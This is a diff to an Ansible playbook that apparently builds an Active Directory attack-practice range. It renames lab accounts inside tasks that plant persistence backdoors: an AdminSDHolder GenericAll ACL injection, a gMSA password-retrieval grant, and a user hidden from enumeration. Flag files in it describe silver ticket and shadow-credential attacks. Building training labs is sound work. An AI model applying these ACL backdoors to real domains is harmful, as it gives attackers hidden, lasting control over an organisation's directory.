@@ -145,13 +145,13 @@
   ignore_errors: yes
 
 # ------------------------------------------------------------------------------
-# PER-015 / PER-033: AdminSDHolder ACL injection (user2 -> GenericAll)
+# PER-015 / PER-033: AdminSDHolder ACL injection (tony.stark -> GenericAll)
 # SDProp re-applies every 60 min; self-healing.
 # ------------------------------------------------------------------------------
-- name: PER-015/033 - AdminSDHolder GenericAll for user2
+- name: PER-015/033 - AdminSDHolder GenericAll for tony.stark
   ansible.windows.win_shell: |-
     Import-Module ActiveDirectory
-    $src = Get-ADUser -Identity user2
+    $src = Get-ADUser -Identity tony.stark
     $domain = (Get-ADDomain).DistinguishedName
     $dn = "CN=AdminSDHolder,CN=System,$domain"
     $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
@@ -201,12 +201,12 @@
   ignore_errors: yes
 
 # ------------------------------------------------------------------------------
-# PER-019: Silver Ticket - service account hash. Flag references svc_web.
+# PER-019: Silver Ticket - service account hash. Flag references svc_vision.
 # ------------------------------------------------------------------------------
 - name: PER-019 - Silver Ticket flag marker
   ansible.windows.win_copy:
     dest: 'C:\Flags\FLAG-PER-019-SilverTicket.txt'
-    content: "PER-019: Forge service ticket for svc_web (SPN HTTP/file01) - silver ticket vs target service."
+    content: "PER-019: Forge service ticket for svc_vision (SPN HTTP/file01) - silver ticket vs target service."
   ignore_errors: yes
 
 # ------------------------------------------------------------------------------
@@ -265,13 +265,13 @@
   ignore_errors: yes
 
 # ------------------------------------------------------------------------------
-# PER-027: Self-Shadow Creds (KeyCredentialLink). user2 GenericWrite on self
+# PER-027: Self-Shadow Creds (KeyCredentialLink). tony.stark GenericWrite on self
 # via AdminSDHolder is already set in PER-015/033. Mark the path.
 # ------------------------------------------------------------------------------
 - name: PER-027 - Self-Shadow Creds flag marker
   ansible.windows.win_copy:
     dest: 'C:\Flags\FLAG-PER-027-ShadowCreds.txt'
-    content: "PER-027: Whisker/Set-ADComputer -KeyCredentialLink - persistent PKINIT auth as user2."
+    content: "PER-027: Whisker/Set-ADComputer -KeyCredentialLink - persistent PKINIT auth as tony.stark."
   ignore_errors: yes
 
 # ------------------------------------------------------------------------------
@@ -289,10 +289,10 @@
       if (-not (Get-ADServiceAccount -Filter "Name -eq 'gmsa01'" -ErrorAction SilentlyContinue)) {
         New-ADServiceAccount -Name 'gmsa01' `
           -DNSHostName 'gmsa01.corp.local' `
-          -PrincipalsAllowedToRetrieveManagedPassword 'attacker' `
+          -PrincipalsAllowedToRetrieveManagedPassword 'loki' `
           -Enabled $true
       } else {
-        Set-ADServiceAccount -Identity 'gmsa01' -PrincipalsAllowedToRetrieveManagedPassword 'attacker'
+        Set-ADServiceAccount -Identity 'gmsa01' -PrincipalsAllowedToRetrieveManagedPassword 'loki'
       }
     } catch { Write-Host "gMSA: $($_.Exception.Message)" }
   ignore_errors: yes
@@ -336,14 +336,14 @@
 
 # ------------------------------------------------------------------------------
 # PER-032: Hidden account via Confidentiality flag (searchFlags bit 7).
-# Set the bit on attacker user so it's excluded from list_object enumeration.
+# Set the bit on loki user so it's excluded from list_object enumeration.
 # Reversible via Set-ADUser -Clear.
 # ------------------------------------------------------------------------------
 - name: PER-032 - Hidden account via list_object exclusion
   ansible.windows.win_shell: |-
     Import-Module ActiveDirectory
     try {
-      $u = Get-ADUser -Identity attacker -Properties nTSecurityDescriptor
+      $u = Get-ADUser -Identity loki -Properties nTSecurityDescriptor
       $domain = (Get-ADDomain).DistinguishedName
       # Deny List Contents to Authenticated Users on the user object
       $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-11'  # Authenticated Users
